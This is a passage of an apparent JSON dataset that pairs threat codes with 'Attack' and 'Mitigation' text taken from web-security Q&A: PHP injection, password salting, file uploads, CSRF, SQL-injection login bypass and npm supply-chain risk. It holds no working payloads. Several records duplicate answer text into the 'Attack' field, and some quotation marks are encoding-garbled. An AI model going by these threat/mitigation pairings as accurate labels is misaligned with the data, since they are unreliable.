    "Attack": " It has never occurred to me that if a malicious hacker were to be able to inject some PHP into a site, that they would effectively be granted access to the entire Linux server (and all its system files). I have only ever thought of PHP as something that operates inside the /vhosts directory (perhaps naively). ",
    "Mitigation": " This is why people will usually create a user for Apache/nginx/insert web server here to run as, and only give it permissions to manipulate files and directories related to the web server. If you don't give this user access permissions to [CODE] or [CODE], it's can't do anything that will affect them. "
  },
  {
    "Threat": "E",
    "Attack": "   You can provide additional protection against dictionary attack by  \u9225\u6e1ftretching\u9225?your password hashes\u9225\u6514epeatedly rehashing to obtain more  computationally intensive byte sequences. If you rehash 100 times, a  dictionary attack that might otherwise take 1 month would take 8  years.  Is the above code right? Will a dictionary attack really take 8 years or so to decipher?  Note the key phrase in the above text, though: \"that might otherwise take 1 month.\" The writer is assuming it would take a month to do the first, and 8 years is approximately 100 months. If it would have taken 1 minute to perform a dictionary attack on the first, you should expect it to take about 1.5 hours to do so on the second. There is no magic \"8 years\" here. It's just 100x the first number, whatever that first number happens to be. ",
    "Mitigation": " Note the key phrase in the above text, though: \"that might otherwise take 1 month.\" The writer is assuming it would take a month to do the first, and 8 years is approximately 100 months. If it would have taken 1 minute to perform a dictionary attack on the first, you should expect it to take about 1.5 hours to do so on the second. There is no magic \"8 years\" here. It's just 100x the first number, whatever that first number happens to be.  EDIT: One more thing to note about stretching. You should always salt before you stretch. Salting means you add a random series of bytes to the start of the password. You then encode that salt along with the hash result (the salt is not a secret). So rather than hashing \"Password is 12345679\", you would hash \"deadbeefPassword is 12345679\" and you would then send \"deadbeef\" in the clear along with the final result. The reason you do this is because people choose the same passwords all the time. So if the attacker works out the result of hashing \"Passw0rd!\" then he could just check that result against your hash. Much cheaper. Similarly, if he had both Alice and Bob's hashes, he could tell if they were the same or different. But with a random salt, you can't do that, since it is almost certain that Alice and Bob will have their data hashed with different salts. "
  },
  {
    "Threat": "E",
    "Attack": " Is it safe enough to give IUSR write permissions to the folder? Must I secure something else?I am afraid of hackers bypassing the ASP page and uploading content directly to the folder. ",
    "Mitigation": " Always, always store the uploaded files in a directory somewhere outside the document root and access them via some accessing-script which does additional sanitizing (and at least explicitly sets a image/whatever MIME type. "
  },
  {
    "Threat": "I",
    "Attack": " I'll use Facebook as the example. Someone at FB could add some sneaky backdoor code to watch users or at very least grab their email &amp; name from our site. DNS cache poisoning could be used to serve malicious Javascript instead of the expected FB library. Etc - there are probably many more attack vectors here. ",
    "Mitigation": " There really isn't any generally accepted solution for this besides either:  Blindly trust Facebook / Google / etc.Don't use their scripts. "
  },
  {
    "Threat": "E",
    "Attack": " But if there is no way to be sure of the network's identity... What about a server that would answer to the question \"Heya am I on the right network ?\" and if no response comes out I know that I'm not on the right one ? (Or that the server just does not respond...) But, again, if the app is hacked, that can be faked too. ",
    "Mitigation": " If we are talking about sensitive data, it shouldn't be stored on the devices.  Instead the device should retrieve the data it needs from your server when it needs it and delete it locally when no longer necessary.  The fact that you want the device to only work when connected to your local network implies that you can accomplish this goal.  As a side note, this is why things such as \"remote wipe\" exist.  It's also why every time the device connects to your network it needs to test it's authentication and authorization.  Point is if someone reports the device lost or stolen then you need to be able to ban it from your network AND, if the device supports this, remotely disable it.    Bearing in mind that it is entirely possible to pull a device from the network and therefore disable a remote wipe from executing.    With that out of the way, there is absolutely no way you can ensure the device is on a given network.  All of that can be faked.  It's kind of trivial to setup a router of a given name and change it's MAC to masquerade as whatever, and assign it certain IP addresses.  For all intents and purposes it could be made to look exactly like an access point you have... And that's just with normal run of the mill wireless routers you can buy at your local computer store. "
  },
  {
    "Threat": "E",
    "Attack": " Just disallowing links than begin with [CODE] won't do much, since an attacker could still include a malicious fragment identifier in a full URL, or even in a link pointing to your site from somewhere else. ",
    "Mitigation": " Of course, if you have some JavaScript on the page that reads that fragment identifier and does something unsafe with it, then all bets are off.  But note that, in such a case, you have a more fundamental security problem that you need to fix.  Just disallowing links than begin with [CODE] won't do much, since an attacker could still include a malicious fragment identifier in a full URL, or even in a link pointing to your site from somewhere else. "
  },
  {
    "Threat": "E",
    "Attack": " I'm not sure this provides any sort of security. If a man-in-the-middle attacker wants to change the parameters, all they must do is change the query string and recompute the SHA-1 hash and send that request along to the server.For example, the URL sent by the browser might be:[LINK]If an attacker intercepts this, they can edit it in this way:[LINK]Really, this boils down to the fact you can trust the hash only as much as the parameters themselves.One way you could fix this would be if the user has a password that only they and the server knows, then it would be impossible for the attacker to recompute the hash if they change the parameters. For example:[LINK]But don't put the password as one of the parameters in the URL :)It is important to note that this isn't the state of the art for verifying the integrity of messages passed between two parties. What is used today is a form of the Hash-based Message Authentication Code (HMAC) algorithm, which is pretty well described in [LINK], and definitively in [LINK] and [LINK]. ",
    "Mitigation": " I'm not sure this provides any sort of security. If a man-in-the-middle attacker wants to change the parameters, all they must do is change the query string and recompute the SHA-1 hash and send that request along to the server.For example, the URL sent by the browser might be:[LINK]If an attacker intercepts this, they can edit it in this way:[LINK]Really, this boils down to the fact you can trust the hash only as much as the parameters themselves.One way you could fix this would be if the user has a password that only they and the server knows, then it would be impossible for the attacker to recompute the hash if they change the parameters. For example:[LINK]But don't put the password as one of the parameters in the URL :)It is important to note that this isn't the state of the art for verifying the integrity of messages passed between two parties. What is used today is a form of the Hash-based Message Authentication Code (HMAC) algorithm, which is pretty well described in [LINK], and definitively in [LINK] and [LINK]. "
  },
  {
    "Threat": "E",
    "Attack": " I was wondering, is there a way to upload a malicious file so that when a user goes to the url for that file, it executes code (on the server side)? ",
    "Mitigation": " As far as i know, uploading the file and visiting it via. the browser can not execute it server-side, unless the server is set to execute files without extensions.However, if there's other vulnerabilities like Local File Inclusion you might be able to upload and execute a php script.  You can read a bit about File inclution here:[LINK] and here[LINK]  If you can execute the file or not depends allot on the server/sites setup, so you'll have to pen-test it you self to se if you can execute a php script.   The only thing you can do in a file with no extension is, as you mention your self, XSS, but only in older browsers (IE8 and down is vulnerable, most other browsers aren't.)  "
  },
  {
    "Threat": "E",
    "Attack": " These \"web vulnerability scanners\" work catching a copy of a form with all its fields and sending thousands of tests in minutes, introducing all kind of malicious strings in the fields.  ",
    "Mitigation": " I checked again the behavior of the known vulnerability scanners. They load the page one time and with the information gathered they start to submit it changing the content of the fields with malicious scripts in order to verify certain types of vulnerabilities.   But: What if we sign the form? How? Creating a hidden field with a random content stored in the Session object. If the value is submitted more than n times we just create it again. We only have to check if it matches, and if it don't just take the actions we want.   But we can do it even better: Why instead to change the value of the field, we change the name of the field randomly? Yes changing the name of the field randomly and storing it in the session object is maybe a more tricky solution, because the form is always different, and the vulnerability scanners just load it once. If we don\u9225\u6a9b get input for a field with the stored name, simply we don't process the form.  "
  },
  {
    "Threat": "I",
    "Attack": " If they knew the value of the cookie and can see a pseudorandom value hidden in a form, wouldnt they have all they need to perform an attack? ",
    "Mitigation": " Same origin policy means that an attacking website is unable to read the cookies from another domain. See [LINK]  We're not talking about an attacker who has a rootkit or something of the sort on a user's computer, what CSRF protects from is a malicious server having a user submit a form via a POST request to a domain that the malicious server wants to attack. Because the malicious server can't read the cookie from the target domain, they can't properly fill out the CSRF field for the POST request they're making. "
  },
  {
    "Threat": "E",
    "Attack": " There are numerous ways an attacker can take advantage of a known open port ranging from exploiting bugs in TCP implementation, causing denial-of-service by tricking your server into performing expensive computation (remember recent [LINK]?), causing buffer overflows to crash your program or to even make it execute arbitrary code.<h3>Platform security</h3>There have been a few vulnerabilities in TCP implementation on some operating systems in which an attacker relied on knowing an open port on a target host, e.g. [LINK]. These have been largely mitigated in all major OSes out there, but whoever is responsible for the security of your host should be on a constant lookout for recent security issues in the platform.<h3>Server security</h3>Vulnerabilities in the OS and TCP implementation aside, there are also potential issues connected with the server itself. If your server can perform security-relevant operations in response to requests it receives, an attacker can take advantage of it. These include reading and writing files, allocating large chunks of memory, sending queries to databases etc.<h3>From developer perspective</h3>Ensuring that your server can run with low privileges and low resources, that it validates all input received from the user and escapes all output it sends to other systems and that it does not perform any unnecessary security-relevant actions are the first steps to making it secure. If you do need to perform security-related operations, you may want to encapsulate them in a separate process and use IPC. Extensive testing of your program is very hard, but critical to its security as well.<h3>From admin perspective</h3>Critical points are making sure recent security updates in the OS have been applied, that your server actually does run with lowest privileges possible and that it is unable to exhaust critical system resources (e.g. CPU, RAM, open file descriptors, open TCP connections etc). ",
    "Mitigation": " There are numerous ways an attacker can take advantage of a known open port ranging from exploiting bugs in TCP implementation, causing denial-of-service by tricking your server into performing expensive computation (remember recent [LINK]?), causing buffer overflows to crash your program or to even make it execute arbitrary code.<h3>Platform security</h3>There have been a few vulnerabilities in TCP implementation on some operating systems in which an attacker relied on knowing an open port on a target host, e.g. [LINK]. These have been largely mitigated in all major OSes out there, but whoever is responsible for the security of your host should be on a constant lookout for recent security issues in the platform.<h3>Server security</h3>Vulnerabilities in the OS and TCP implementation aside, there are also potential issues connected with the server itself. If your server can perform security-relevant operations in response to requests it receives, an attacker can take advantage of it. These include reading and writing files, allocating large chunks of memory, sending queries to databases etc.<h3>From developer perspective</h3>Ensuring that your server can run with low privileges and low resources, that it validates all input received from the user and escapes all output it sends to other systems and that it does not perform any unnecessary security-relevant actions are the first steps to making it secure. If you do need to perform security-related operations, you may want to encapsulate them in a separate process and use IPC. Extensive testing of your program is very hard, but critical to its security as well.<h3>From admin perspective</h3>Critical points are making sure recent security updates in the OS have been applied, that your server actually does run with lowest privileges possible and that it is unable to exhaust critical system resources (e.g. CPU, RAM, open file descriptors, open TCP connections etc). "
  },
  {
    "Threat": "I",
    "Attack": "",
    "Mitigation": " Longer answer: If you try to do it without HTTPS, you will find yourself trying to reproduce everything that HTTPS was designed to do. You could reach at some point, but it is unrealistic to believe that you will succeed in implementing even the 1% that HTTPS offers. The only benefit you will have would be an obscure security mechanism (security through obscurity), which may be OK for not critical systems, but would fail miserably in a real critical situation.  You could create your own certificate you know and then work with Ajax the same way as with regular HTTP calls. The only drawback is that the users will get a warning message. "
  },
  {
    "Threat": "E",
    "Attack": " I'm worried that giving users a way to initiate a GET request from my box to any arbitrary URL on the net may serve as a vector for attacks (e.g. to [CODE]). ",
    "Mitigation": " Are the statistics going to be only about the text in the document? Are you going to evaluate it using a HTML parser?  If it's only the text that you're going to analyze, that is, without downloading further links, evaluating scripts, etc. then the risk is less severe.  It probably wouldn't hurt to pass each file you download through an Anti-Virus program. You should also restrict the GETs to certain content-types (i.e. don't download binaries; make sure it's some sort of text encoding). "
  },
  {
    "Threat": "E",
    "Attack": " The program data of a process is not the only thing that affects its behavior. Stack overflows, where malicious code is written into the stack and jumped into, make integrity checking of the original program text moot. Not to mention the fact that an attacker can use the original unchanged program text [LINK]. ",
    "Mitigation": " In any case, to address the question: You can possibly write a kernel module that instantiates a kernel thread that, on a timer, hops through each process and checks its integrity. This can be done by using the page tables for each process, mapping in the read only pages, and integrity checking them. This may not work, though, as each memory page probably needs to have its own signature, unless you concatenate them all together somehow.  A good thing to note is that shared libraries only need to be integrity checked once per sweep, since they are re-mapped across all the processes that use them. It takes sophistication to implement this though, so maybe have this under this \"nice-to-have\" section of your design. "
  },
  {
    "Threat": "I",
    "Attack": " I'm using Node.js to create the web service. In the implementation, I consumed many third party modules which are installed via npm. There is security issue if there is malicious *.js scripts in the consumed modules. For example, the malicious code may delete all my disk files, or collect the secret data in silence. ",
    "Mitigation": " To secure your own app, you do not need to read the entire source code of all packages in your project.  You only need to review those functions which are actually called.You may trace the code by reading it, or with the aid of [LINK], or a [LINK].  (Of course you should look out for branching, where different inputs may cause different parts of the module to be called.)Set breakpoints when you call into a module which you don't trust, so you can step through the code that is called and see what it does.  You may be able to conclude that only a small part of the module is used, so only that code needs to be verified.Whilst tracing flow should cover concerns about sensitive data at runtime, to check for file access or database access, we should also look at the initialisation code of each module which is required, and all calls (including [CODE]s) which are made from there.  4. Other measures  It might be wise to lock the version number of each package in [CODE] so that you don't accidentally install a new version of a package until you decide that you need to.  You may use social factors to build confidence in a package.  Check the respectability of the author.  Who is he, and who does he work for?  Do the author and his employers have a reputation to uphold?  Similarly, who uses his project?  If the package is very popular, and used by industry giants, it is likely that others have already reviewed the code. "
  },
  {
    "Threat": "E",
    "Attack": "   We could mitigate much of the risk of these vulnerabilities by frequently changing our URLs \u9225?not once every 200 years but once every 10 minutes. Attackers would no longer be able to exploit application vulnerabilities by mass e-mailing poisoned hyperlinks because the links would be broken and invalid by the time the messages reached their intended victims.  ",
    "Mitigation": "   We could mitigate much of the risk of these vulnerabilities by frequently changing our URLs \u9225?not once every 200 years but once every 10 minutes. Attackers would no longer be able to exploit application vulnerabilities by mass e-mailing poisoned hyperlinks because the links would be broken and invalid by the time the messages reached their intended victims.   Which I guess (and the article agrees) is one facet of a total approach to preventing this issue from happening.  Microsoft also has a good [LINK] that talks about this. "
  },
  {
    "Threat": "E",
    "Attack": " We use a PHP string to embed the user input from the POST on the login form.  My question is, how vulnerable is this code, and could someone log into this page and not need the password?  I would think maybe they wouldn't need the username, but could only brute force the password.  But I'm no SQL guru and am wondering if some tricks could be used against us. ",
    "Mitigation": " \"Could someone log into this page and not need the password\": Yes, trivially.  Try the username [CODE]. "
  },
  {
    "Threat": "E",
    "Attack": " Only this way, (assuming that some bit of the checksum are stripped every time a successful decryption occurs) there will be a way (looking at the checksum) to estimate how close it is to decryption -- this this a major vulnerability ? is the checksum methodology an appropriate simplification? ",
    "Mitigation": " N.B. The encryption per se isn't that complicated I don't think, but there may be one or two subtleties to be careful of. For example, in a normal single client-server conversation, one subtlety you have to be careful of is to never encrypt the same block of data twice with the same key (or at least, that's what it boils down to-- research \"block modes\" and \"initialisation vectors\" if you're not familiar with this concept). In a single client-server conversation the client and server can dictate parts of the initialisation vector. In an onion router, some other solution will have to be found (at worst, using strongly-generated random numbers generated by the client alone, I suppose). "
  },
  {
    "Threat": "E",
    "Attack": " What I am concerned is with hackers going through my code and retrieving the password that I have stored there and use it to hack the license breaking the first security barrier. ",
    "Mitigation": " Your best bet is to cut down on casual-piracy.  Consider that you have two classes of users.  The normal user and the pirate.  The pirate will go to great lengths to crack your application.  The normal user just wants to use your application to get something done.  You can't do anything about the pirate.  A normal user isn't going to know anything about cracking code (\"uh...what's a hex editor?\").  If it is easier for this type of person to buy the application than it is to pirate it, then they are more likely to buy it.  It looks like the solutions you have already considered will be effective against the normal user.  And that's about all that you can do. "
  },
  {
    "Threat": "I",
    "Attack": " Securing a WebService is not as simple as passing a get parameter through the URL. Get parameters are logged on HTTP server logs and easily copy/pasted and manipulated. ",
    "Mitigation": " WebService security is not a simple problem, try to use well know solutions, I would go with OAuth. PHP has a good implementation here [LINK]  You can also check this post about Web Services security [LINK] "
  }
]